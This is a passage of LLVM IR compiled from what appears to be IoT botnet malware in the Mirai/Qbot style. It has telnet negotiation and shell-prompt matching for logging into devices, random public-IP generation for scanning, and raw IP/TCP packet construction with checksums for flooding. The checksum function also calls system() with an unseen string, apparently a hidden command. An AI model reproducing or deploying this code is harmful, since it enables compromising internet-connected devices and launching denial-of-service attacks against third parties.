  store i8* %8, i8** bitcast (i32** @pids to i8**), align 8
  br label %23

; <label>:23:                                     ; preds = %0, %._crit_edge
  ret i32 %1
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) local_unnamed_addr #1 {
  %4 = alloca i8, align 1
  %5 = getelementptr inbounds i8, i8* %1, i64 1
  %6 = load i8, i8* %5, align 1
  %.off = add i8 %6, 5
  %switch = icmp ult i8 %.off, 4
  br i1 %switch, label %7, label %20

; <label>:7:                                      ; preds = %3
  store i8 -1, i8* %4, align 1
  %8 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #3
  %9 = load i8, i8* %5, align 1
  switch i8 %9, label %13 [
    i8 -4, label %10
    i8 -2, label %11
    i8 3, label %12
  ]

; <label>:10:                                     ; preds = %7
  store i8 -2, i8* %4, align 1
  br label %16

; <label>:11:                                     ; preds = %7
  store i8 -4, i8* %4, align 1
  br label %16

; <label>:12:                                     ; preds = %7
  store i8 -3, i8* %4, align 1
  br label %16

; <label>:13:                                     ; preds = %7
  %14 = icmp eq i8 %9, -3
  %15 = select i1 %14, i8 -4, i8 -2
  store i8 %15, i8* %4, align 1
  br label %16

; <label>:16:                                     ; preds = %11, %13, %12, %10
  %17 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #3
  %18 = getelementptr inbounds i8, i8* %1, i64 2
  %19 = call i64 @send(i32 %0, i8* %18, i64 1, i32 16384) #3
  br label %20

; <label>:20:                                     ; preds = %3, %16
  ret i32 0
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @matchPrompt(i8* nocapture readonly) local_unnamed_addr #11 {
.preheader:
  %1 = tail call i64 @strlen(i8* %0) #15
  %2 = trunc i64 %1 to i32
  %sext = shl i64 %1, 32
  %3 = ashr exact i64 %sext, 32
  %4 = getelementptr inbounds i8, i8* %0, i64 %3
  %sext29 = shl i64 %1, 32
  %5 = ashr exact i64 %sext29, 32
  %6 = getelementptr inbounds i8, i8* %0, i64 %5
  %sext41 = shl i64 %1, 32
  %7 = ashr exact i64 %sext41, 32
  %8 = icmp sgt i32 %2, 0
  br i1 %8, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.preheader.137:                                   ; preds = %.critedge
  %9 = icmp sgt i32 %2, %.1.lcssa
  br i1 %9, label %.lr.ph.preheader.1, label %.critedge.1

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.critedge1
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %.130 = phi i32 [ %14, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %10 = sub nsw i64 0, %indvars.iv
  %11 = getelementptr inbounds i8, i8* %6, i64 %10
  %12 = load i8, i8* %11, align 1
  %13 = trunc i64 %indvars.iv to i32
  switch i8 %12, label %.critedge.loopexit [
    i8 0, label %.critedge1
    i8 32, label %.critedge1
    i8 13, label %.critedge1
    i8 10, label %.critedge1
  ]

.critedge1:                                       ; preds = %.lr.ph, %.lr.ph, %.lr.ph, %.lr.ph
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %14 = add nsw i32 %.130, 1
  %15 = icmp sgt i64 %7, %indvars.iv.next
  br i1 %15, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %.critedge1
  %.1.lcssa.ph = phi i32 [ %13, %.lr.ph ], [ %14, %.critedge1 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.1.lcssa = phi i32 [ 0, %.preheader ], [ %.1.lcssa.ph, %.critedge.loopexit ]
  %16 = sext i32 %.1.lcssa to i64
  %17 = sub nsw i64 0, %16
  %18 = getelementptr inbounds i8, i8* %4, i64 %17
  %19 = load i8, i8* %18, align 1
  %20 = icmp eq i8 %19, 58
  br i1 %20, label %21, label %.preheader.137

; <label>:21:                                     ; preds = %.critedge.3, %.critedge.2, %.critedge.1, %.critedge
  ret i32 1

.lr.ph.preheader.1:                               ; preds = %.preheader.137
  %22 = sext i32 %.1.lcssa to i64
  br label %.lr.ph.1

.lr.ph.1:                                         ; preds = %.critedge1.1, %.lr.ph.preheader.1
  %indvars.iv.1 = phi i64 [ %22, %.lr.ph.preheader.1 ], [ %indvars.iv.next.1, %.critedge1.1 ]
  %.130.1 = phi i32 [ %.1.lcssa, %.lr.ph.preheader.1 ], [ %27, %.critedge1.1 ]
  %23 = sub nsw i64 0, %indvars.iv.1
  %24 = getelementptr inbounds i8, i8* %6, i64 %23
  %25 = load i8, i8* %24, align 1
  %26 = trunc i64 %indvars.iv.1 to i32
  switch i8 %25, label %.critedge.1.loopexit [
    i8 0, label %.critedge1.1
    i8 32, label %.critedge1.1
    i8 13, label %.critedge1.1
    i8 10, label %.critedge1.1
  ]

.critedge1.1:                                     ; preds = %.lr.ph.1, %.lr.ph.1, %.lr.ph.1, %.lr.ph.1
  %indvars.iv.next.1 = add nsw i64 %indvars.iv.1, 1
  %27 = add nsw i32 %.130.1, 1
  %28 = icmp sgt i64 %7, %indvars.iv.next.1
  br i1 %28, label %.lr.ph.1, label %.critedge.1.loopexit

.critedge.1.loopexit:                             ; preds = %.critedge1.1, %.lr.ph.1
  %.1.lcssa.1.ph = phi i32 [ %26, %.lr.ph.1 ], [ %27, %.critedge1.1 ]
  br label %.critedge.1

.critedge.1:                                      ; preds = %.critedge.1.loopexit, %.preheader.137
  %.1.lcssa.1 = phi i32 [ %.1.lcssa, %.preheader.137 ], [ %.1.lcssa.1.ph, %.critedge.1.loopexit ]
  %29 = sext i32 %.1.lcssa.1 to i64
  %30 = sub nsw i64 0, %29
  %31 = getelementptr inbounds i8, i8* %4, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = icmp eq i8 %32, 62
  br i1 %33, label %21, label %.preheader.238

.preheader.238:                                   ; preds = %.critedge.1
  %34 = icmp sgt i32 %2, %.1.lcssa.1
  br i1 %34, label %.lr.ph.preheader.2, label %.critedge.2

.lr.ph.preheader.2:                               ; preds = %.preheader.238
  %35 = sext i32 %.1.lcssa.1 to i64
  br label %.lr.ph.2

.lr.ph.2:                                         ; preds = %.critedge1.2, %.lr.ph.preheader.2
  %indvars.iv.2 = phi i64 [ %35, %.lr.ph.preheader.2 ], [ %indvars.iv.next.2, %.critedge1.2 ]
  %.130.2 = phi i32 [ %.1.lcssa.1, %.lr.ph.preheader.2 ], [ %40, %.critedge1.2 ]
  %36 = sub nsw i64 0, %indvars.iv.2
  %37 = getelementptr inbounds i8, i8* %6, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = trunc i64 %indvars.iv.2 to i32
  switch i8 %38, label %.critedge.2.loopexit [
    i8 0, label %.critedge1.2
    i8 32, label %.critedge1.2
    i8 13, label %.critedge1.2
    i8 10, label %.critedge1.2
  ]

.critedge1.2:                                     ; preds = %.lr.ph.2, %.lr.ph.2, %.lr.ph.2, %.lr.ph.2
  %indvars.iv.next.2 = add nsw i64 %indvars.iv.2, 1
  %40 = add nsw i32 %.130.2, 1
  %41 = icmp sgt i64 %7, %indvars.iv.next.2
  br i1 %41, label %.lr.ph.2, label %.critedge.2.loopexit

.critedge.2.loopexit:                             ; preds = %.critedge1.2, %.lr.ph.2
  %.1.lcssa.2.ph = phi i32 [ %39, %.lr.ph.2 ], [ %40, %.critedge1.2 ]
  br label %.critedge.2

.critedge.2:                                      ; preds = %.critedge.2.loopexit, %.preheader.238
  %.1.lcssa.2 = phi i32 [ %.1.lcssa.1, %.preheader.238 ], [ %.1.lcssa.2.ph, %.critedge.2.loopexit ]
  %42 = sext i32 %.1.lcssa.2 to i64
  %43 = sub nsw i64 0, %42
  %44 = getelementptr inbounds i8, i8* %4, i64 %43
  %45 = load i8, i8* %44, align 1
  %46 = icmp eq i8 %45, 37
  br i1 %46, label %21, label %.preheader.339

.preheader.339:                                   ; preds = %.critedge.2
  %47 = icmp sgt i32 %2, %.1.lcssa.2
  br i1 %47, label %.lr.ph.preheader.3, label %.critedge.3

.lr.ph.preheader.3:                               ; preds = %.preheader.339
  %48 = sext i32 %.1.lcssa.2 to i64
  br label %.lr.ph.3

.lr.ph.3:                                         ; preds = %.critedge1.3, %.lr.ph.preheader.3
  %indvars.iv.3 = phi i64 [ %48, %.lr.ph.preheader.3 ], [ %indvars.iv.next.3, %.critedge1.3 ]
  %.130.3 = phi i32 [ %.1.lcssa.2, %.lr.ph.preheader.3 ], [ %53, %.critedge1.3 ]
  %49 = sub nsw i64 0, %indvars.iv.3
  %50 = getelementptr inbounds i8, i8* %6, i64 %49
  %51 = load i8, i8* %50, align 1
  %52 = trunc i64 %indvars.iv.3 to i32
  switch i8 %51, label %.critedge.3.loopexit [
    i8 0, label %.critedge1.3
    i8 32, label %.critedge1.3
    i8 13, label %.critedge1.3
    i8 10, label %.critedge1.3
  ]

.critedge1.3:                                     ; preds = %.lr.ph.3, %.lr.ph.3, %.lr.ph.3, %.lr.ph.3
  %indvars.iv.next.3 = add nsw i64 %indvars.iv.3, 1
  %53 = add nsw i32 %.130.3, 1
  %54 = icmp sgt i64 %7, %indvars.iv.next.3
  br i1 %54, label %.lr.ph.3, label %.critedge.3.loopexit

.critedge.3.loopexit:                             ; preds = %.critedge1.3, %.lr.ph.3
  %.1.lcssa.3.ph = phi i32 [ %52, %.lr.ph.3 ], [ %53, %.critedge1.3 ]
  br label %.critedge.3

.critedge.3:                                      ; preds = %.critedge.3.loopexit, %.preheader.339
  %.1.lcssa.3 = phi i32 [ %.1.lcssa.2, %.preheader.339 ], [ %.1.lcssa.3.ph, %.critedge.3.loopexit ]
  %55 = sext i32 %.1.lcssa.3 to i64
  %56 = sub nsw i64 0, %55
  %57 = getelementptr inbounds i8, i8* %4, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = icmp eq i8 %58, 36
  br i1 %59, label %21, label %.preheader.440

.preheader.440:                                   ; preds = %.critedge.3
  %60 = icmp sgt i32 %2, %.1.lcssa.3
  br i1 %60, label %.lr.ph.preheader.4, label %.critedge.4

.lr.ph.preheader.4:                               ; preds = %.preheader.440
  %61 = sext i32 %.1.lcssa.3 to i64
  br label %.lr.ph.4

.lr.ph.4:                                         ; preds = %.critedge1.4, %.lr.ph.preheader.4
  %indvars.iv.4 = phi i64 [ %61, %.lr.ph.preheader.4 ], [ %indvars.iv.next.4, %.critedge1.4 ]
  %.130.4 = phi i32 [ %.1.lcssa.3, %.lr.ph.preheader.4 ], [ %66, %.critedge1.4 ]
  %62 = sub nsw i64 0, %indvars.iv.4
  %63 = getelementptr inbounds i8, i8* %6, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = trunc i64 %indvars.iv.4 to i32
  switch i8 %64, label %.critedge.4.loopexit [
    i8 0, label %.critedge1.4
    i8 32, label %.critedge1.4
    i8 13, label %.critedge1.4
    i8 10, label %.critedge1.4
  ]

.critedge1.4:                                     ; preds = %.lr.ph.4, %.lr.ph.4, %.lr.ph.4, %.lr.ph.4
  %indvars.iv.next.4 = add nsw i64 %indvars.iv.4, 1
  %66 = add nsw i32 %.130.4, 1
  %67 = icmp sgt i64 %7, %indvars.iv.next.4
  br i1 %67, label %.lr.ph.4, label %.critedge.4.loopexit

.critedge.4.loopexit:                             ; preds = %.critedge1.4, %.lr.ph.4
  %.1.lcssa.4.ph = phi i32 [ %65, %.lr.ph.4 ], [ %66, %.critedge1.4 ]
  br label %.critedge.4

.critedge.4:                                      ; preds = %.critedge.4.loopexit, %.preheader.440
  %.1.lcssa.4 = phi i32 [ %.1.lcssa.3, %.preheader.440 ], [ %.1.lcssa.4.ph, %.critedge.4.loopexit ]
  %68 = sext i32 %.1.lcssa.4 to i64
  %69 = sub nsw i64 0, %68
  %70 = getelementptr inbounds i8, i8* %4, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = icmp eq i8 %71, 35
  %. = zext i1 %72 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8* nocapture readonly, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %9 = alloca %struct.__sigset_t, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = sext i32 %3 to i64
  %12 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 0
  store i64 %11, i64* %12, align 8
  %13 = sext i32 %4 to i64
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 1
  store i64 %13, i64* %14, align 8
  %15 = add nsw i32 %7, 2
  %16 = icmp slt i32 %15, %6
  br i1 %16, label %.lr.ph, label %.critedge

.lr.ph:                                           ; preds = %8
  %17 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i64 0, i32 0, i64 0
  %18 = srem i32 %0, 64
  %19 = zext i32 %18 to i64
  %20 = shl i64 1, %19
  %21 = sdiv i32 %0, 64
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i64 0, i32 0, i64 %22
  %24 = add nsw i32 %0, 1
  %25 = icmp eq i32 %2, 0
  br label %26

; <label>:26:                                     ; preds = %.lr.ph, %.backedge
  %.03335 = phi i32 [ %7, %.lr.ph ], [ %44, %.backedge ]
  %27 = load i64, i64* %12, align 8
  %28 = icmp sgt i64 %27, 0
  %29 = load i64, i64* %14, align 8
  %30 = icmp sgt i64 %29, 0
  %31 = or i1 %28, %30
  br i1 %31, label %32, label %.critedge.loopexit

; <label>:32:                                     ; preds = %26
  %33 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %17) #3, !srcloc !3
  %34 = load i64, i64* %23, align 8
  %35 = or i64 %34, %20
  store i64 %35, i64* %23, align 8
  %36 = call i32 @select(i32 %24, %struct.__sigset_t* nonnull %9, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* nonnull %10) #3
  %37 = icmp slt i32 %36, 1
  br i1 %37, label %.critedge.loopexit, label %38

; <label>:38:                                     ; preds = %32
  %39 = sext i32 %.03335 to i64
  %40 = getelementptr inbounds i8, i8* %5, i64 %39
  %41 = call i64 @recv(i32 %0, i8* %40, i64 1, i32 0) #3
  %42 = trunc i64 %41 to i32
  switch i32 %42, label %43 [
    i32 -1, label %.critedge.loopexit
    i32 0, label %.critedge.loopexit
  ]

; <label>:43:                                     ; preds = %38
  %44 = add nsw i32 %42, %.03335
  %45 = load i8, i8* %40, align 1
  %46 = icmp eq i8 %45, -1
  br i1 %46, label %47, label %53

; <label>:47:                                     ; preds = %43
  %48 = getelementptr inbounds i8, i8* %40, i64 1
  %49 = call i64 @recv(i32 %0, i8* %48, i64 2, i32 0) #3
  %50 = trunc i64 %49 to i32
  switch i32 %50, label %51 [
    i32 -1, label %.critedge
    i32 0, label %.critedge
  ]

; <label>:51:                                     ; preds = %47
  %52 = call i32 @negotiate(i32 %0, i8* nonnull %40, i32 undef)
  br label %.critedge

; <label>:53:                                     ; preds = %43
  %54 = call i8* @strstr(i8* nonnull %5, i8* %1) #15
  %55 = icmp eq i8* %54, null
  br i1 %55, label %56, label %.critedge.loopexit

; <label>:56:                                     ; preds = %53
  br i1 %25, label %.backedge, label %59

.backedge:                                        ; preds = %56, %59
  %57 = add nsw i32 %44, 2
  %58 = icmp slt i32 %57, %6
  br i1 %58, label %26, label %.critedge.loopexit

; <label>:59:                                     ; preds = %56
  %60 = call i32 @matchPrompt(i8* nonnull %5)
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %.backedge, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.backedge, %26, %32, %59, %53, %38, %38
  %.0.ph = phi i32 [ 0, %38 ], [ 0, %38 ], [ 1, %53 ], [ 1, %59 ], [ 0, %32 ], [ 0, %26 ], [ 0, %.backedge ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %8, %47, %47, %51
  %.0 = phi i32 [ 0, %51 ], [ 0, %47 ], [ 0, %47 ], [ 0, %8 ], [ %.0.ph, %.critedge.loopexit ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() local_unnamed_addr #1 {
  %1 = alloca [16 x i8], align 16
  br label %.critedge

.critedge:                                        ; preds = %.critedge.backedge, %0
  %2 = tail call i32 @rand() #3
  %3 = tail call i32 @rand() #3
  %4 = srem i32 %3, 255
  %5 = tail call i32 @rand() #3
  %6 = srem i32 %5, 255
  %7 = tail call i32 @rand() #3
  %8 = srem i32 %7, 255
  %9 = and i32 %4, 255
  %trunc = trunc i32 %4 to i8
  switch i8 %trunc, label %.thread87 [
    i8 0, label %.critedge.backedge
    i8 10, label %.critedge.backedge
    i8 100, label %10
    i8 127, label %.critedge.backedge
    i8 -87, label %13
    i8 -84, label %14
  ]

; <label>:10:                                     ; preds = %.critedge
  %11 = and i32 %6, 192
  %12 = icmp eq i32 %11, 64
  br i1 %12, label %.critedge.backedge, label %.thread87

; <label>:13:                                     ; preds = %.critedge
  %.old = and i32 %6, 255
  %.old51 = icmp eq i32 %.old, 254
  br i1 %.old51, label %.critedge.backedge, label %.thread87

.critedge.backedge:                               ; preds = %13, %10, %.critedge, %.critedge, %.critedge, %14, %.thread87, %20, %28, %.critedge71, %26
  br label %.critedge

; <label>:14:                                     ; preds = %.critedge
  %.old53 = and i32 %6, 255
  %.old54 = icmp ult i32 %.old53, 17
  br i1 %.old54, label %.critedge.backedge, label %.thread87

.thread87:                                        ; preds = %10, %13, %.critedge, %14
  %15 = icmp eq i32 %9, 192
  %16 = and i32 %6, 255
  %17 = icmp eq i32 %16, 0
  %or.cond58 = and i1 %15, %17
  %18 = and i32 %8, 255
  %19 = icmp eq i32 %18, 2
  %or.cond61 = and i1 %or.cond58, %19
  br i1 %or.cond61, label %.critedge.backedge, label %20

; <label>:20:                                     ; preds = %.thread87
  %21 = icmp eq i32 %16, 88
  %or.cond64 = and i1 %15, %21
  %22 = icmp eq i32 %18, 99
  %or.cond67 = and i1 %or.cond64, %22
  %23 = icmp eq i32 %16, 168
  %or.cond70 = and i1 %15, %23
  %or.cond90 = or i1 %or.cond70, %or.cond67
  br i1 %or.cond90, label %.critedge.backedge, label %24

; <label>:24:                                     ; preds = %20
  %25 = icmp eq i32 %9, 198
  br i1 %25, label %26, label %.critedge71

; <label>:26:                                     ; preds = %24
  %27 = and i32 %6, 254
  %switch = icmp eq i32 %27, 18
  br i1 %switch, label %.critedge.backedge, label %28

; <label>:28:                                     ; preds = %26
  %29 = icmp eq i32 %16, 51
  %30 = icmp eq i32 %18, 100
  %or.cond77 = and i1 %29, %30
  br i1 %or.cond77, label %.critedge.backedge, label %.critedge71

.critedge71:                                      ; preds = %24, %28
  %31 = icmp eq i32 %9, 203
  %or.cond80 = and i1 %31, %17
  %32 = icmp eq i32 %18, 113
  %or.cond83 = and i1 %or.cond80, %32
  %33 = icmp ugt i32 %9, 223
  %or.cond85 = or i1 %33, %or.cond83
  br i1 %or.cond85, label %.critedge.backedge, label %34

; <label>:34:                                     ; preds = %.critedge71
  %35 = srem i32 %2, 255
  %36 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %36, i8 0, i64 16, i32 16, i1 false)
  %37 = and i32 %35, 255
  %38 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %36, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.73, i64 0, i64 0), i32 %37, i32 %9, i32 %16, i32 %18)
  %39 = call i32 @inet_addr(i8* nonnull %36) #3
  ret i32 %39
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) local_unnamed_addr #1 {
  %2 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %3 = tail call i32 @ntohl(i32 %2) #18
  %4 = and i32 %3, %0
  %5 = tail call i32 @rand_cmwc()
  %6 = xor i32 %0, -1
  %7 = and i32 %5, %6
  %8 = xor i32 %7, %4
  ret i32 %8
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #9

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @csum(i16* nocapture readonly, i32) local_unnamed_addr #10 {
  %3 = icmp sgt i32 %1, 1
  br i1 %3, label %.lr.ph16.preheader, label %._crit_edge17

.lr.ph16.preheader:                               ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %xtraiter = and i32 %addconv, 3
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph16.prol.loopexit, label %.lr.ph16.prol.preheader

.lr.ph16.prol.preheader:                          ; preds = %.lr.ph16.preheader
  br label %.lr.ph16.prol

.lr.ph16.prol:                                    ; preds = %.lr.ph16.prol, %.lr.ph16.prol.preheader
  %.014.prol = phi i64 [ %11, %.lr.ph16.prol ], [ 0, %.lr.ph16.prol.preheader ]
  %.0913.prol = phi i32 [ %12, %.lr.ph16.prol ], [ %1, %.lr.ph16.prol.preheader ]
  %.01012.prol = phi i16* [ %8, %.lr.ph16.prol ], [ %0, %.lr.ph16.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph16.prol ], [ %xtraiter, %.lr.ph16.prol.preheader ]
  %8 = getelementptr inbounds i16, i16* %.01012.prol, i64 1
  %9 = load i16, i16* %.01012.prol, align 2
  %10 = zext i16 %9 to i64
  %11 = add i64 %10, %.014.prol
  %12 = add nsw i32 %.0913.prol, -2
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph16.prol.loopexit.unr-lcssa, label %.lr.ph16.prol, !llvm.loop !4

.lr.ph16.prol.loopexit.unr-lcssa:                 ; preds = %.lr.ph16.prol
  br label %.lr.ph16.prol.loopexit

.lr.ph16.prol.loopexit:                           ; preds = %.lr.ph16.preheader, %.lr.ph16.prol.loopexit.unr-lcssa
  %.014.unr = phi i64 [ 0, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.0913.unr = phi i32 [ %1, %.lr.ph16.preheader ], [ %12, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.01012.unr = phi i16* [ %0, %.lr.ph16.preheader ], [ %8, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.lcssa26.unr = phi i64 [ undef, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %13 = icmp ult i32 %4, 6
  br i1 %13, label %._crit_edge17.loopexit, label %.lr.ph16.preheader.new

.lr.ph16.preheader.new:                           ; preds = %.lr.ph16.prol.loopexit
  br label %.lr.ph16

.lr.ph16:                                         ; preds = %.lr.ph16, %.lr.ph16.preheader.new
  %.014 = phi i64 [ %.014.unr, %.lr.ph16.preheader.new ], [ %29, %.lr.ph16 ]
  %.0913 = phi i32 [ %.0913.unr, %.lr.ph16.preheader.new ], [ %30, %.lr.ph16 ]
  %.01012 = phi i16* [ %.01012.unr, %.lr.ph16.preheader.new ], [ %26, %.lr.ph16 ]
  %14 = getelementptr inbounds i16, i16* %.01012, i64 1
  %15 = load i16, i16* %.01012, align 2
  %16 = zext i16 %15 to i64
  %17 = add i64 %16, %.014
  %18 = getelementptr inbounds i16, i16* %.01012, i64 2
  %19 = load i16, i16* %14, align 2
  %20 = zext i16 %19 to i64
  %21 = add i64 %20, %17
  %22 = getelementptr inbounds i16, i16* %.01012, i64 3
  %23 = load i16, i16* %18, align 2
  %24 = zext i16 %23 to i64
  %25 = add i64 %24, %21
  %26 = getelementptr inbounds i16, i16* %.01012, i64 4
  %27 = load i16, i16* %22, align 2
  %28 = zext i16 %27 to i64
  %29 = add i64 %28, %25
  %30 = add nsw i32 %.0913, -8
  %31 = icmp sgt i32 %30, 1
  br i1 %31, label %.lr.ph16, label %._crit_edge17.loopexit.unr-lcssa

._crit_edge17.loopexit.unr-lcssa:                 ; preds = %.lr.ph16
  br label %._crit_edge17.loopexit

._crit_edge17.loopexit:                           ; preds = %.lr.ph16.prol.loopexit, %._crit_edge17.loopexit.unr-lcssa
  %.lcssa26 = phi i64 [ %.lcssa26.unr, %.lr.ph16.prol.loopexit ], [ %29, %._crit_edge17.loopexit.unr-lcssa ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %32 = sub i32 %4, %7
  br label %._crit_edge17

._crit_edge17:                                    ; preds = %._crit_edge17.loopexit, %2
  %.010.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge17.loopexit ]
  %.09.lcssa = phi i32 [ %1, %2 ], [ %32, %._crit_edge17.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa26, %._crit_edge17.loopexit ]
  %33 = icmp eq i32 %.09.lcssa, 1
  br i1 %33, label %34, label %.preheader

; <label>:34:                                     ; preds = %._crit_edge17
  %35 = bitcast i16* %.010.lcssa to i8*
  %36 = load i8, i8* %35, align 1
  %37 = zext i8 %36 to i64
  %38 = add i64 %37, %.0.lcssa
  br label %.preheader

.preheader:                                       ; preds = %34, %._crit_edge17
  %.1.ph = phi i64 [ %.0.lcssa, %._crit_edge17 ], [ %38, %34 ]
  %39 = lshr i64 %.1.ph, 16
  %40 = icmp eq i64 %39, 0
  br i1 %40, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %41 = phi i64 [ %44, %.lr.ph ], [ %39, %.lr.ph.preheader ]
  %.111 = phi i64 [ %43, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %42 = and i64 %.111, 65535
  %43 = add nuw nsw i64 %42, %41
  %44 = lshr i64 %43, 16
  %45 = icmp eq i64 %44, 0
  br i1 %45, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.1.lcssa = phi i64 [ %.1.ph, %.preheader ], [ %43, %._crit_edge.loopexit ]
  %46 = trunc i64 %.1.lcssa to i16
  %47 = xor i16 %46, -1
  ret i16 %47
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr* nocapture readonly, %struct.tcphdr* nocapture readonly) local_unnamed_addr #1 {
  %3 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %4 = load i32, i32* %3, align 4
  %5 = zext i32 %4 to i64
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %7 = load i32, i32* %6, align 4
  %8 = zext i32 %7 to i64
  %9 = tail call zeroext i16 @htons(i16 zeroext 20) #18
  %10 = tail call noalias i8* @malloc(i64 44) #3
  %11 = bitcast i8* %10 to i16*
  %.sroa.0.0..sroa_cast = bitcast i8* %10 to i64*
  store i64 %5, i64* %.sroa.0.0..sroa_cast, align 1
  %.sroa.2.0..sroa_idx6 = getelementptr inbounds i8, i8* %10, i64 8
  %.sroa.2.0..sroa_cast = bitcast i8* %.sroa.2.0..sroa_idx6 to i64*
  store i64 %8, i64* %.sroa.2.0..sroa_cast, align 1
  %.sroa.3.0..sroa_idx = getelementptr inbounds i8, i8* %10, i64 16
  store i8 0, i8* %.sroa.3.0..sroa_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %10, i64 17
  store i8 6, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %.sroa.5.0..sroa_idx7 = getelementptr inbounds i8, i8* %10, i64 18
  %12 = bitcast i8* %.sroa.5.0..sroa_idx7 to i16*
  store i16 %9, i16* %12, align 1
  %13 = getelementptr inbounds i8, i8* %10, i64 24
  %14 = bitcast %struct.tcphdr* %1 to i8*
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %13, i8* %14, i64 20, i32 1, i1 false)
  %15 = tail call zeroext i16 @csum(i16* %11, i32 44)
  %16 = tail call i32 @system(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.74, i64 0, i64 0)) #3
  tail call void @free(i8* %10) #3
  ret i16 %15
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #6

declare i32 @system(i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeIPPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #0 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
